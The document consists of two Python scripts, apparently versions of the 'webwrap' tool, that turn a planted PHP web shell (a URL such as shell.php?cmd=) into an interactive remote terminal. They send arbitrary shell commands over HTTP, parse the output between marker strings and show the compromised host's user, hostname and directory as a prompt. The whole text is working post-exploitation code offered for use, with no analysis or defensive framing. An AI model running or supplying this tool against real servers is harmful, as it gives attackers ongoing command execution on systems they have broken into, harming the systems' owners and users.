#!/usr/bin/python3

#USAGE : webwrap 'http://somewebsite.com/shell.php?cmd='

import readline
from termcolor import colored
import urllib.parse
import sys
import requests

link = sys.argv[1]

commands = []

pat = "ZYZZ"
ech = "echo -n '"+pat+"';"

while True:
	prefix = ""
	if len(commands)>0:
		prefix = ";".join(commands)+";"

	who,host,pwd = requests.get(link+urllib.parse.quote(ech+prefix+"echo -n `whoami`#`hostname`#`pwd`"+' 2>&1;'+ech)).text.split(pat)[1].split("#")
	desc = colored(who+"@"+host,"green")+":"+colored(pwd,"blue")+colored("$ ","white")

	com = input(desc)
	fcom = prefix+com
	rep = requests.get(link+urllib.parse.quote(ech+fcom+' 2>&1;'+ech)).text.split(pat)[1]

	print(rep)

	if (com[:3] == "cd ") and not "cd" in rep:
		if len(com)>2 and com[3]=="/":
			commands = []
		commands.append(com)
		
#############
#############

#!/usr/bin/python3

##
## https://github.com/mxrch/webwrap
##
##

import httpx
import re
from termcolor import colored
import urllib.parse
import sys

if len(sys.argv) >= 2 and "WRAP" in sys.argv[1]:
	host = sys.argv[1]
else:
	print("\nPlease specify the url with WRAP where the command belongs.\nExample :\n$ webwrap http://localhost:8000/webshell.php?cmd=WRAP")
	exit()
	
try:
	reg = """\]LEDEBUT\]([\s\S]*)\]LAFIN\]"""

	req = httpx.get(host.replace("WRAP", "echo -n ]LEDEBUT]$(whoami)[$(hostname)[$(pwd)]LAFIN]"))
	matches = re.compile(reg).findall(req.text)
	if not matches:
		print("Req.text not found!\n")
		exit(-1)
	prefixes = matches[0].split("[")
	path = prefixes[2]
	prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
	print("")

	while 1:
		cmd = input(prefix)
		cmd = urllib.parse.quote("echo -n ']LEDEBUT]' ; cd {} && ".format(path) + cmd + " 2>&1 ; echo $(whoami)[$(hostname)[$(pwd) ; echo ']LAFIN]'")
		req = httpx.get(host.replace("WRAP", cmd))
		try:
			output = re.compile(reg).findall(req.text)[0].split('\n')
			prefixes = output.pop(len(output) - 2).split("[")
			path = prefixes[2]
			prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
			output = "\n".join(output)
			print(output)
		except IndexError:
			print("Error.\n")
except KeyboardInterrupt:
	print(colored("\nGoodbye !", "cyan"))
	exit()
		
#####
#####
##
##
		
